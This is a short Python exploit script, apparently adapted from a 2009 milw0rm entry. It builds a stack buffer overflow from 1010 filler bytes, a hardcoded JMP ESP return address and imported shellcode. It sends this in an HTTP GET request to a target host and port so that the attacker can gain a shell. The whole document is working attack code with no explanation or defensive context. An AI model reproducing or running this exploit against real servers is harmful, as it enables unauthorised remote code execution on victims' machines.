#!/usr/bin/env python 


import struct
from struct import pack
from payload import buf
import socket
def shell_attack(target_machine, target_port):

    port = target_port
    host = target_machine
    Junk_buffer = b'A'*1010
    Jump_esp = struct.pack(b'<L',0x77F84143)

    
    # create a socket object called 'c' 
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

    # connect to the socket 
    c.connect((host, port)) 

    Request = (Junk_buffer + Jump_esp + buf)

    # create a file-like object to read 
    fileobj = c.makefile('r', 0) 

    # Ask the server for the file 
    fileobj.write("GET /"+str(Request)+" HTTP/1.1\n\n") 

    # milw0rm.com [2009-04-01]